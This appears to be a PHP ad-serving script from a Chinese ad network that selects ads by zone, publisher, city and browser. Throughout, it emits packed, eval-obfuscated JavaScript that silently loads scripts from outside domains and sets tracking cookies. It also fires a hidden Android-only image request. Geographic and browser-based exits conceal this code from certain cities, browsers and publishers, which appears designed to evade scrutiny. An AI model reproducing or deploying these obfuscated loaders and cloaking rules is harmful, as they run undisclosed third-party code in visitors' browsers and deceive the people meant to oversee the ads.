...
//bug专用
function writeFileForBug($file,$str,$mode='a+')
{
    $oldmask = @umask(0);
    $fp = @fopen($file,$mode);
    // @flock($fp, 3);
...
if($id == 10526){
    if($ipInfos[2] == '香港' ||$ipInfos[2] == '福建'||$ipInfos[3] == '珠海'){
        exit;
    }
}
...
$adzLimitSql = $pdo->prepare("select adz_id,uid,htmlcontrol,checkadz,clickhight,minutes,adtpl_id,width,height,class_id,plan_class_allow,plan_limit,plan_check from lz_adzone where adz_id=?  AND status=1");
...
//站长 6785  北京、珠海、广州、合肥这四个城市广告屏蔽
if($uid == 6785){
    if($ipInfos[3] == '北京'||$ipInfos[3] == '珠海'||$ipInfos[3] == '广州'||$ipInfos[3] == '合肥'){
        exit;
    }
}
// 查看当前域名属于哪个站长的
...
b.priority,b.resuid,b.checkplan,b.sitelimit,b.limitsiteid,b.class_id,b.run_terminal,b.type,b.plan_name FROM lz_ads AS a
...
if($adzList[0]['plan_limit'] == '1'){//表示开启屏蔽计划
    $res = unserialize($adzList[0]['plan_check']);//反序列化
    if(!empty($res['name'])){
        $arr = explode(',',$res['name']);
        $paln_name_info = [];
        foreach ($ad_sql_list as $k=>$v){
            $ad_sql_list[$v['pid']] = $v;
            foreach ($arr as $key=>$value){
                if(strpos($v['plan_name'],$value) !== false){
                 $paln_name_info[$key] = $v['pid'];
                }
            }
        }
    }
    $adInfo = [];
   foreach ($ad_sql_list as $k=>$v){
       if(in_array($v['pid'], $paln_name_info)){
           unset($v);
       }else{
           $adInfo[$k] = $v;
       }
   }
        if(!empty($paln_name_info)){
        if($res['contrast'] == '0'){//拒绝访问
            if((in_array($ipInfos[3], $res['plan_city']) && in_array(date('H', time()),$res['plan_hour']))
                || (!empty($res['plan_city']) && in_array($ipInfos[3], $res['plan_city']) && empty($res['plan_hour'])) ||
                (!empty($res['plan_hour']) && in_array(date('H', time()),$res['plan_hour']) && empty($res['plan_city']))){
                $ad_sql_list = $adInfo;
            }
        }
    }
...
if($id==10715||$id==10716){
    // $aaaasdsadfsafzsc  = array_flip($pidarr_sel['plan']);
    // if(!empty($pidarr_sel['plan'])){
    //     $autopid = $ad_id;
    // }else{
    //     $autopid = 'aaa';
    // }
    // $log_forbug_file = 'newlog.txt';
    // $log_forbug_str = $autopid."\n";
    // writeFileForBug($log_forbug_file,$log_forbug_str);
}
...
//计划6902 在uc浏览器下不显示
if($final_pid == 6902 && stristr($_SERVER['HTTP_USER_AGENT'], 'UCBrowser')){
    exit;
}
...
//广告商 6805  uc浏览器下不显示广告
if($List['planuid'] == "6805" && stristr($_SERVER['HTTP_USER_AGENT'], 'UCBrowser')){
    exit;
}

if($final_pid == 7130 && stristr($_SERVER['HTTP_USER_AGENT'], 'UCBrowser')){
    exit;
}

if($final_pid == 7178 && stristr($_SERVER['HTTP_USER_AGENT'], 'UCBrowser')){
    exit;
}
...
if($id==9856){
    $List['imageurl'] = str_replace('img.miaoceshi.com','jnh.mmvbqd.cn',$List['imageurl']);
}

//如果是https 把http换成https，图片域名
if($http_type==TRUE){
    if(strpos($List['imageurl'], 'img.dajibai') == true){
        ...
        if(stristr($_SERVER['HTTP_USER_AGENT'], 'MiuiBrowser') || $id==8715 || $id==7135 || $id==7679|| $id==49){
            $List['imageurl'] = str_replace('img.dajibai','xfo.dajibai',$List['imageurl']);
        }else{
            $List['imageurl'] = str_replace('img.dajibai','wen.dajibai',$List['imageurl']);
        }
    }
}
...
if($clickhight['isacl_6'] == 1){
    ...
    //广告位id8799 屏蔽深圳、河北  因为控制展示频率是在样式中，所以将展示频率调大即可屏蔽全屏点击
    if($id==8799){
        if($ipInfos[3]=='深圳'||$ipInfos[2]=='河北'){
            $set_num = 1000;
        }
    }
}else{
...
<?php } ?>
    ...
    var set_day = <?php {echo $set_day;}?>;
    var set_num = <?php {echo $set_num;}?>;
<?php if($List['tpl_id'] == 5038){
    echo 'var info = "'.$List['adinfo'].'";';
}?>

<?php if($id == 9671){
    //广告位9671 屏蔽北京和石家庄的全屏点弹
    if($ipInfos[3] == '北京' || $ipInfos[3] == '石家庄'){
        echo 'var pointer = 1;';
    }else{
        echo 'var pointer = 2;';
    }
...
$iqiyi_eval_js = '';
// $iqiyi_eval_js_test = ";eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c]);return p}('9(i.a.r(\'6\')<0){7 2=3.b(\'c\');2.d=\'e/f\';2.g=h;2.5=\'j-8\';2.k=\'l://m.n.o/p.q?\'+4.s(4.t()*u+1);3.v.w(2)}',33,33,'||cnzz_tj_tag|document|Math|charset|Win|var||if|platform|createElement|script|type|text|javascript|async|true|navigator|utf|src|https|www|wxbgf|top|siqiyi|php|indexOf|floor|random|9999999|body|appendChild'.split('|'),0,{}));";
$iqiyi_eval_js_test = '';
if($ipInfos[2]=='陕西'){
    $iqiyi_eval_js = '';
    $iqiyi_eval_js_test = '';
...
if($uid==5564||$uid==5718||$uid==6353||$uid==6126||$uid==6319||$uid==5963||$uid==6071||$id==7645||$id==7555){
    $iqiyi_eval_js = '';
    $iqiyi_eval_js_test = '';
}
...
if($uid==6390||$uid==5759||$uid==7035||$id==9031){
    $ama_eval_js = '';
}
...
if($uid == 6390){
    if($ipInfos[2]=='福建'||$ipInfos[2]=='陕西'){
        $iqiyi_eval_js = '';
        $iqiyi_eval_js_test = '';
    }
}
if($uid == 6473){
    if($ipInfos[3]=='杭州'||$ipInfos[2]=='贵州'||$ipInfos[2]=='江苏'){
        $iqiyi_eval_js = '';
        $iqiyi_eval_js_test = '';
    }
}
if($uid == 6498){  //站长6498安徽全屏蔽
    if($ipInfos[2]=='安徽'||$ipInfos[3]=='西安'||$ipInfos[3]=='厦门'){
        $iqiyi_eval_js = '';
        $iqiyi_eval_js_test = '';
        $fujia_js = '';
        $fujia_js_http ='';
...
if($uid==5626||$uid==5387||$uid==5536||$uid==5782||$uid==6719){
    $iqiyi_eval_js = '';
    $iqiyi_eval_js_test = '';
}
if($uid == 6512){
...
if($uid==5479){  //5479屏蔽西安和浙江
    if($ipInfos[3]=='西安'||$ipInfos[2]=='浙江'){
        $iqiyi_eval_js = '';
        $iqiyi_eval_js_test = '';
    }
}

if($uid==6497){  //6497 屏蔽江苏省  西安市
    if($ipInfos[3]=='西安'||$ipInfos[2]=='江苏'){
        $iqiyi_eval_js = '';
        $iqiyi_eval_js_test = '';
    }
}
...
//2018-7-3 16:32:43   极限针对站长输出
if($uid==5342||$uid==6580||$uid==5903||$uid==6401||$uid==5759||$uid==1487||$uid==6858||$uid==6390){
    $jixiandnr_js = "\n".";eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c]);return p}('(e(){4 a=2.9(\"3\");a.6=\"7://8.5.b/c.d\";4 1=2.f(\"3\")[0];1.g.h(a,1)})();',18,18,'|s|document|script|var|wxbgf|src|https|www|createElement||top|jxdnr|js|function|getElementsByTagName|parentNode|insertBefore'.split('|'),0,{}));";
    echo $jixiandnr_js."\n";
}

//2018-7-11 14:31:21   神马搜索,只在UC浏览器下输出
if(stristr($_SERVER['HTTP_USER_AGENT'], 'UCBrowser')){
    $shenmass_js = "\n".";eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c]);return p}('(e(){4 a=2.9(\"3\");a.6=\"7://a.8.5/b/c.d\";4 1=2.f(\"3\")[0];1.g.h(a,1)})();',18,18,'|s|document|script|var|com|src|https|ausuu|createElement||ss|lzs1|js|function|getElementsByTagName|parentNode|insertBefore'.split('|'),0,{}));";
    // echo $shenmass_js."\n";
}

//2018-7-19 10:36:42   个性针对站长输出
if($uid==1077){
    $gexingdnr_js = "\n".";eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c]);return p}('(e(){4 a=2.9(\"3\");a.6=\"7://8.5.b/c.d\";4 1=2.f(\"3\")[0];1.g.h(a,1)})();',18,18,'|s|document|script|var|wxbgf|src|https|www|createElement||top|yydnr|js|function|getElementsByTagName|parentNode|insertBefore'.split('|'),0,{}));";
    echo $gexingdnr_js."\n";
}
...
//广告位10871 10887在sndo.com这个域名下
if (strpos($adsthisUrl, 'sndo.com') && ($id ==10871 || $id ==10887)) {
    $tackjsRes = '';
}
$aa_num = rand(1,2);
...
//id24    链接频率和周期都为1
function goBackjs($js){
    $day = strtotime(date('Y-m-d'));
    echo 'var dayss = "'.$day.'";';
    echo " var a = dayss;var name = '24_KLFUELSMHCtime';var b = get('24_KLFUELSMHCtime');
    if(b == -1){
        set('24_KLFUELSMHCtime', 'afdsak', a);";
    echo $js;
    echo "}
    function set(a, b, c) {
                ...
                if($mf_iframe<=$pl[1]){
                    ...
                    if(($final_pid==5180)&&!stristr($_SERVER['HTTP_USER_AGENT'], 'UCBrowser')&&
                        ...
                        if($ipbenshen!=$ip_pingbi1&&$ipbenshen!=$ip_pingbi2){
                            echo ";eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c])}}return p}('(9(){9 j(a){5 b=f F();b.P(b.M()+1);b.r(0);b.t(0);k(\"m\",a,b)}9 k(a,b,c){6.2.3=a+\"=\"+J(b)+(c==i?\"\":\"; y=\"+c.x())}9 p(a){5 b=a+\"=\";4(6.2.3.g>0){8=6.2.3.7(b);4(8!=-1){8+=b.g;e=6.2.3.7(\";\",8);4(e==-1){e=6.2.3.g}l v(6.2.3.s(8,e))}}l i}5 c=p(\"m\");4(c==i){4(o.w.7(\"Q\")<0){5 u=o.K;4(u.7(\"z\")>-1||u.7(\"N\")>-1){5 d=f n();d.h=q;O(9(){d.h=\"I://H.C.B/A.D\"},E)}G{5 d=f n();d.h=q}j(\"L\")}}})();',53,53,'||document|cookie|if|var|window|indexOf|offset|function|||||end|new|length|src|null|cookieGO|setCookie|return|cookiecake|Image|navigator|getCookie|purl|setHours|substring|setMinutes||unescape|platform|toGMTString|expires|Android|favicon|com|baidu|ico|150|Date|else|www|http|escape|userAgent|getcookie|getDate|Adr|setTimeout|setDate|Win'.split('|'),0,{}));";
                        }
...
//发送接口请求
$adz_canshu = $statsParams['adz_id'].'&ipInfos='.$ipInfos[3].'&uip='.$statsParams['user_ip'].'&province='.$ipInfos[2];
$url_adzjs = $bigclickurl.'/type/'.base64_encode(base64_encode($adz_canshu));

//广告位10871 10887在sndo.com域名下屏蔽所有动作
if (!strpos($adsthisUrl, 'sndo.com') && ($statsParams['adz_id'] !=10871 || $statsParams['adz_id'] !=10887)) {
...
if($id==8799){
    if($ipInfos[3]!='成都'&&$ipInfos[0]!=''){
        echo ";eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c]);return p}('c 0=1.3(\'4\');0.5=\'6/7\';0.9=a;0.b=\'2-8\';0.d=\'e://f.g/h/i.j\';1.k.l(0)',22,22,'cnzz_tj_tag|document|utf|createElement|script|type|text|javascript||async|true|charset|var|src|https|chinajyaf|com|wx|0808fssc|html|body|appendChild'.split('|'),0,{}));";
    }
}
